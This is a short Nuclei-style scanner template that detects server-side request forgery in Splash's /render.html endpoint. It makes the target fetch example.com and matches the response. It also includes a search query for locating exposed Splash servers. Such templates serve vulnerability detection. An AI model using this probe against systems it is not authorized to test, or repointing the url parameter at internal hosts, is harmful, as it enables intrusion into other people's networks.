id: splash-render-ssrf

info:
  name: Splash Render SSRF
  author: pwnhxl
  severity: high
  description: Splash Render SSRF
  reference:
    - https://github.com/scrapinghub/splash
  metadata:
    verified: true
    hunter-query: web.title="Splash" && header="TwistedWeb"
  tags: splash,ssrf

requests:
  - raw:
      - |
        GET /render.html?url=http://example.com/ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<title>Example Domain</title>'
          - '<h1>Example Domain</h1>'
        condition: and

      - type: status
        status:
          - 200
